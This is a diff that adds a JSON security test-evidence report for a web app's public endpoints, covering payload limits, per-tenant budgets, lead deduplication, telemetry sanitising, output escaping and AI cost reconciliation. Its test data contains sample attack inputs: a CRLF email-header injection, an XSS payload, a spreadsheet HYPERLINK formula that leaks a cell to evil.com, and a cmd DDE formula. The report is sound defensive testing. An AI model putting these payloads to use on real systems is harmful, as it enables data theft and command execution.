@@ -1,0 +1,440 @@
+{
+  "ticket": "CD05",
+  "title": "Public Endpoint Controls and Budgets Evidence",
+  "timestamp": "2026-11-03T18:39:33.614Z",
+  "summary": {
+    "total_tests": 30,
+    "passed": 30,
+    "failed": 0,
+    "all_passed": true
+  },
+  "guarantees": {
+    "direct_script_protection": "ENFORCED (Origin / Referer headers are never treated as authentication)",
+    "in_flight_concurrency_ceiling": "ENFORCED (Atomic in-flight slot tracking rejects excess concurrent bursts)",
+    "budget_quota_reservation": "ENFORCED (Per-tenant atomic token budget with bounded in-flight burst allowance)",
+    "noisy_neighbor_isolation": "ENFORCED (Tenant A exhaustion has zero impact on Tenant B health/quotas)",
+    "lead_replay_deduplication": "ENFORCED (Content hash idempotency deduplicates submissions within 60s window)",
+    "arbitrary_recipient_protection": "ENFORCED (Public callers cannot specify arbitrary email destinations)",
+    "body_size_limits": "ENFORCED (32KB/16KB tight caps for text/leads/telemetry; 4MB cap for image diagnostics)",
+    "untrusted_telemetry_isolation": "ENFORCED (Client privilege claims stripped and stamped anonymous visitor)",
+    "csv_formula_injection_defense": "ENFORCED (Formulas prefixed with single quote and RFC 4180 escaped)",
+    "unknown_usage_accounting": "ENFORCED (Missing provider usage recorded as 'unknown', never 0)",
+    "charge_reconciliation": "IMPLEMENTED (reconcileAiCharges helper compares traced operations to invoice)"
+  },
+  "results": [
+    {
+      "test_id": "AC1.1",
+      "name": "Direct script without Origin header is governed by strict validation controls",
+      "status": "PASS",
+      "details": "Expected status 400 INVALID_PAYLOAD, got 400",
+      "evidence": {
+        "statusCode": 400,
+        "body": {
+          "error": "Session ID required as a string.",
+          "code": "INVALID_PAYLOAD"
+        }
+      },
+      "timestamp": "2026-11-03T18:39:31.568Z"
+    },
+    {
+      "test_id": "AC1.2",
+      "name": "Request with spoofed Origin is governed by identical 32KB payload size caps (returns 413)",
+      "status": "PASS",
+      "details": "Expected status 413 PAYLOAD_TOO_LARGE, got 413",
+      "evidence": {
+        "statusCode": 413,
+        "body": {
+          "error": "Payload too large. Header length (35071 bytes) exceeds maximum of 32768 bytes.",
+          "code": "PAYLOAD_TOO_LARGE",
+          "maxBytes": 32768
+        }
+      },
+      "timestamp": "2026-11-03T18:39:31.568Z"
+    },
+    {
+      "test_id": "AC1.3",
+      "name": "Unsupported HTTP method (GET on POST-only route) rejected with 405 Method Not Allowed",
+      "status": "PASS",
+      "details": "Expected status 405, got 405",
+      "evidence": {
+        "statusCode": 405,
+        "body": {
+          "error": "Method not allowed.",
+          "code": "METHOD_NOT_ALLOWED"
+        }
+      },
+      "timestamp": "2026-11-03T18:39:31.568Z"
+    },
+    {
+      "test_id": "AC2.1",
+      "name": "Concurrent burst obeys explicit in-flight ceiling (accepted exactly within budget + allowance)",
+      "status": "PASS",
+      "details": "Expected accepted: 7, rejected: 18; Got accepted: 7, rejected: 18",
+      "evidence": {
+        "acceptedCount": 7,
+        "rejectedCount": 18,
+        "totalRequests": 25
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC2.2",
+      "name": "Subsequent requests after budget exhaustion return 429 BUDGET_EXCEEDED",
+      "status": "PASS",
+      "details": "Expected allowed: false, code: BUDGET_EXCEEDED, got: {\"allowed\":false,\"tenantId\":\"tenant_burst_test\",\"consumedTokens\":9000,\"reservedTokens\":3500,\"budgetLimit\":10000,\"inFlightAllowance\":2500,\"error\":\"Tenant 'tenant_burst_test' has exhausted its AI budget for the current window (12500/10000 tokens).\",\"code\":\"BUDGET_EXCEEDED\"}",
+      "evidence": {
+        "allowed": false,
+        "code": "BUDGET_EXCEEDED"
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC2.3",
+      "name": "In-flight concurrency ceiling rejects requests exceeding max concurrency with 429",
+      "status": "PASS",
+      "details": "Expected allowed: false on 6th request, got allowed: false",
+      "evidence": {
+        "maxConcurrency": 5,
+        "excessAllowed": false
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC3.1",
+      "name": "Tenant A budget is completely exhausted and returns BUDGET_EXCEEDED (429)",
+      "status": "PASS",
+      "details": "Expected allowed: false, got: false",
+      "evidence": {
+        "tenantA": "tenant_alpha_exhausted",
+        "allowed": false
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC3.2",
+      "name": "Tenant B remains 100% healthy, accessible, and unhindered by Tenant A exhaustion",
+      "status": "PASS",
+      "details": "Expected Tenant B allowed: true, got: true",
+      "evidence": {
+        "tenantB": "tenant_beta_healthy",
+        "allowed": true
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC3.3",
+      "name": "Concurrency state is strictly partitioned per-tenant (Tenant A saturated does not block Tenant B)",
+      "status": "PASS",
+      "details": "Expected Tenant B slot allowed: true, got: true",
+      "evidence": {
+        "tenantBAllowed": true
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC4.1",
+      "name": "Initial valid lead submission succeeds and records content idempotency hash",
+      "status": "PASS",
+      "details": "Expected allowed: true, isDuplicate: false, got allowed: true",
+      "evidence": {
+        "leadHash": "64860bbcaa391c44af48bad64a07815ac79bc95bfa095e57a716176c3581017e"
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC4.2",
+      "name": "Replayed identical lead submission within 60s is detected and deduplicated",
+      "status": "PASS",
+      "details": "Expected isDuplicate: true, got: true",
+      "evidence": {
+        "isDuplicate": true,
+        "reason": "Exact duplicate lead submission received within deduplication window."
+      },
+      "timestamp": "2026-11-03T18:39:31.569Z"
+    },
+    {
+      "test_id": "AC4.3",
+      "name": "Excessive lead submissions from same session/IP are throttled (> 5 per window)",
+      "status": "PASS",
+      "details": "Expected isRateLimited: true, got: true",
+      "evidence": {
+        "isRateLimited": true,
+        "reason": "Lead submission rate limit exceeded for this session. Please wait before submitting another lead."
+      },
+      "timestamp": "2026-11-03T18:39:31.570Z"
+    },
+    {
+      "test_id": "AC4.4",
+      "name": "Public lead POST strips client-supplied arbitrary recipient fields (to, cc, bcc, receiverEmail)",
+      "status": "PASS",
+      "details": "Hostile recipient fields present after processing: to=undefined, bcc=undefined",
+      "evidence": {
+        "stripped": true
+      },
+      "timestamp": "2026-11-03T18:39:32.784Z"
+    },
+    {
+      "test_id": "AC4.5",
+      "name": "stripCrlf sanitizes email header inputs, eliminating CRLF injection characters",
+      "status": "PASS",
+      "details": "Sanitized output: \"Welcome to CloseDesk Bcc: spam_victim@evil.com Subject: Injected\"",
+      "evidence": {
+        "rawHeader": "Welcome to CloseDesk\r\nBcc: spam_victim@evil.com\r\nSubject: Injected",
+        "sanitized": "Welcome to CloseDesk Bcc: spam_victim@evil.com Subject: Injected"
+      },
+      "timestamp": "2026-11-03T18:39:32.785Z"
+    },
+    {
+      "test_id": "AC5.1",
+      "name": "Oversized request body (> 32KB) rejected with 413 Payload Too Large (no stack trace)",
+      "status": "PASS",
+      "details": "Expected status 413, got 413",
+      "evidence": {
+        "statusCode": 413,
+        "code": "PAYLOAD_TOO_LARGE"
+      },
+      "timestamp": "2026-11-03T18:39:32.785Z"
+    },
+    {
+      "test_id": "AC5.2",
+      "name": "Oversized image payload (> 4MB) in /api/analyze-image rejected with 413 Payload Too Large",
+      "status": "PASS",
+      "details": "Expected status 413, got 413",
+      "evidence": {
+        "statusCode": 413,
+        "code": "PAYLOAD_TOO_LARGE"
+      },
+      "timestamp": "2026-11-03T18:39:32.793Z"
+    },
+    {
+      "test_id": "AC5.3",
+      "name": "Malformed field types (messages: number) return safe 400 without stack-trace leakage",
+      "status": "PASS",
+      "details": "Expected status 400, got 400",
+      "evidence": {
+        "statusCode": 400,
+        "body": {
+          "error": "Conversation history required as an array.",
+          "code": "INVALID_PAYLOAD"
+        }
+      },
+      "timestamp": "2026-11-03T18:39:32.793Z"
+    },
+    {
+      "test_id": "AC5.4",
+      "name": "Invalid image URI format in /api/analyze-image rejected with 400 INVALID_IMAGE_PAYLOAD",
+      "status": "PASS",
+      "details": "Expected status 400 INVALID_IMAGE_PAYLOAD, got 400 INVALID_IMAGE_PAYLOAD",
+      "evidence": {
+        "statusCode": 400,
+        "code": "INVALID_IMAGE_PAYLOAD"
+      },
+      "timestamp": "2026-11-03T18:39:32.794Z"
+    },
+    {
+      "test_id": "AC6.1",
+      "name": "sanitizeUntrustedTelemetry strips client-supplied privilege claims (actor, role, isSuperAdmin, auditOutcome)",
+      "status": "PASS",
+      "details": "Sanitized: {\"event_type\":\"page_view\",\"pagePath\":\"/home\",\"actor\":\"anonymous_visitor\",\"role\":\"public\",\"source\":\"untrusted_client\",\"verified_by_server\":false}",
+      "evidence": {
+        "sanitized": {
+          "event_type": "page_view",
+          "pagePath": "/home",
+          "actor": "anonymous_visitor",
+          "role": "public",
+          "source": "untrusted_client",
+          "verified_by_server": false
+        }
+      },
+      "timestamp": "2026-11-03T18:39:32.794Z"
+    },
+    {
+      "test_id": "AC6.2",
+      "name": "POST /api/app-state ingests log after quarantining client privilege claims into anonymous visitor scope",
+      "status": "PASS",
+      "details": "Status: 200, body: {\"success\":true,\"log_id\":\"log_test_forgery_01\"}",
+      "evidence": {
+        "statusCode": 200
+      },
+      "timestamp": "2026-11-03T18:39:33.205Z"
+    },
+    {
+      "test_id": "AC6.3",
+      "name": "POST /api/cookie-consent isolates untrusted client telemetry and ignores spoofed authority fields",
+      "status": "PASS",
+      "details": "Status: 200",
+      "evidence": {
+        "statusCode": 200
+      },
+      "timestamp": "2026-11-03T18:39:33.612Z"
+    },
+    {
+      "test_id": "AC7.1",
+      "name": "escapeHtml neutralizes HTML/script tags into safe entities (&lt;script&gt;)",
+      "status": "PASS",
+      "details": "Safe HTML: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;steal()&quot;/&gt;",
+      "evidence": {
+        "rawXss": "<script>alert(\"XSS\")</script><img src=\"x\" onerror=\"steal()\"/>",
+        "safeHtml": "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;steal()&quot;/&gt;"
+      },
+      "timestamp": "2026-11-03T18:39:33.613Z"
+    },
+    {
+      "test_id": "AC7.2",
+      "name": "sanitizeCsvCell prefixes formula cells (=HYPERLINK...) with single quote (') and escapes inner quotes per RFC 4180",
+      "status": "PASS",
+      "details": "Output: \"'=HYPERLINK(\"\"http://evil.com?leak=\"\"&A1,\"\"Click Me\"\")\"",
+      "evidence": {
+        "dangerousCell": "=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Me\")",
+        "safeCell": "\"'=HYPERLINK(\"\"http://evil.com?leak=\"\"&A1,\"\"Click Me\"\")\""
+      },
+      "timestamp": "2026-11-03T18:39:33.613Z"
+    },
+    {
+      "test_id": "AC7.3",
+      "name": "All formula command execution triggers (=, +, -, @, \\t, \\r) are neutralized with single quote prefix",
+      "status": "PASS",
+      "details": "All 6 triggers neutralized: true",
+      "evidence": {
+        "prefixes": [
+          "=cmd|' /C calc'!A0",
+          "+12345",
+          "-54321",
+          "@SUM(A1:A10)",
+          "\tmalicious_tab",
+          "\rnewline_lead"
+        ]
+      },
+      "timestamp": "2026-11-03T18:39:33.613Z"
+    },
+    {
+      "test_id": "AC7.4",
+      "name": "formatCsvRow builds RFC 4180 row with uniform formula injection protection",
+      "status": "PASS",
+      "details": "Formatted row: \"lead_101\",\"'=cmd\",\"John Doe\",\"john@test.com\",\"'@Executive\"",
+      "evidence": {
+        "rowCells": [
+          "lead_101",
+          "=cmd",
+          "John Doe",
+          "john@test.com",
+          "@Executive"
+        ],
+        "formattedRow": "\"lead_101\",\"'=cmd\",\"John Doe\",\"john@test.com\",\"'@Executive\""
+      },
+      "timestamp": "2026-11-03T18:39:33.613Z"
+    },
+    {
+      "test_id": "AC7.5",
+      "name": "Report.jsx executeCSVExport source audit confirms formula injection protection ([=+-@\\t\\r])",
+      "status": "PASS",
+      "details": "Formula defense present: true",
+      "evidence": {
+        "hasFormulaDefense": true
+      },
+      "timestamp": "2026-11-03T18:39:33.613Z"
+    },
+    {
+      "test_id": "AC8.1",
+      "name": "Authoritative AI trace record contains provider, model, tenantId, sessionId, operation, usage, cost, and retryCount",
+      "status": "PASS",
+      "details": "Trace record: {\"trace_id\":\"trace_1793731173613_1lm6h\",\"timestamp\":\"2026-11-03T18:39:33.613Z\",\"provider\":\"openai\",\"model\":\"gpt-4o-mini\",\"tenantId\":\"tenant_alpha\",\"sessionId\":\"lead_test_ai_01\",\"operation\":\"chat\",\"retryCount\":0,\"usage\":{\"total_tokens\":150,\"prompt_tokens\":100,\"completion_tokens\":50},\"estimatedCostUsd\":0.000045,\"status\":\"completed\",\"duration_ms\":0}",
+      "evidence": {
+        "trace": {
+          "trace_id": "trace_1793731173613_1lm6h",
+          "timestamp": "2026-11-03T18:39:33.613Z",
+          "provider": "openai",
+          "model": "gpt-4o-mini",
+          "tenantId": "tenant_alpha",
+          "sessionId": "lead_test_ai_01",
+          "operation": "chat",
+          "retryCount": 0,
+          "usage": {
+            "total_tokens": 150,
+            "prompt_tokens": 100,
+            "completion_tokens": 50
+          },
+          "estimatedCostUsd": 0.000045,
+          "status": "completed",
+          "duration_ms": 0
+        }
+      },
+      "timestamp": "2026-11-03T18:39:33.613Z"
+    },
+    {
+      "test_id": "AC8.2",
+      "name": "Missing provider usage is explicitly recorded as 'unknown' (NEVER 0!) for WebRTC / audio operations",
+      "status": "PASS",
+      "details": "usage.total_tokens: unknown",
+      "evidence": {
+        "usage": {
+          "total_tokens": "unknown",
+          "prompt_tokens": "unknown",
+          "completion_tokens": "unknown"
+        }
+      },
+      "timestamp": "2026-11-03T18:39:33.614Z"
+    },
+    {
+      "test_id": "AC8.3",
+      "name": "reconcileAiCharges aggregates known token costs, tallies unknown operations, and confirms reconciled status",
+      "status": "PASS",
+      "details": "Status: reconciled, variance: 0",
+      "evidence": {
+        "reconciliation": {
+          "reconciliation_timestamp": "2026-11-03T18:39:33.614Z",
+          "total_operations_traced": 3,
+          "known_usage_operations": 2,
+          "unknown_usage_operations": 1,
+          "total_prompt_tokens": 4500,
+          "total_completion_tokens": 1500,
+          "total_traced_cost_usd": 0.001575,
+          "invoice_total_cost_usd": 0.001575,
+          "variance_usd": 0,
+          "reconciliation_status": "reconciled",
+          "provider_breakdown": {
+            "openai": {
+              "count": 2,
+              "cost": 0.001575,
+              "unknownCount": 0
+            },
+            "openai-realtime": {
+              "count": 1,
+              "cost": 0,
+              "unknownCount": 1
+            }
+          }
+        }
+      },
+      "timestamp": "2026-11-03T18:39:33.614Z"
+    },
+    {
+      "test_id": "AC8.4",
+      "name": "reconcileAiCharges flags variance_detected when traced spend deviates from provider invoice",
+      "status": "PASS",
+      "details": "Status: variance_detected, variance: $-5.4998",
+      "evidence": {
+        "result": {
+          "reconciliation_timestamp": "2026-11-03T18:39:33.614Z",
+          "total_operations_traced": 1,
+          "known_usage_operations": 1,
+          "unknown_usage_operations": 0,
+          "total_prompt_tokens": 0,
+          "total_completion_tokens": 0,
+          "total_traced_cost_usd": 0.0002,
+          "invoice_total_cost_usd": 5.5,
+          "variance_usd": -5.4998,
+          "reconciliation_status": "variance_detected",
+          "provider_breakdown": {
+            "openai": {
+              "count": 1,
+              "cost": 0.0002,
+              "unknownCount": 0
+            }
+          }
+        }
+      },
+      "timestamp": "2026-11-03T18:39:33.614Z"
+    }
+  ]
+}
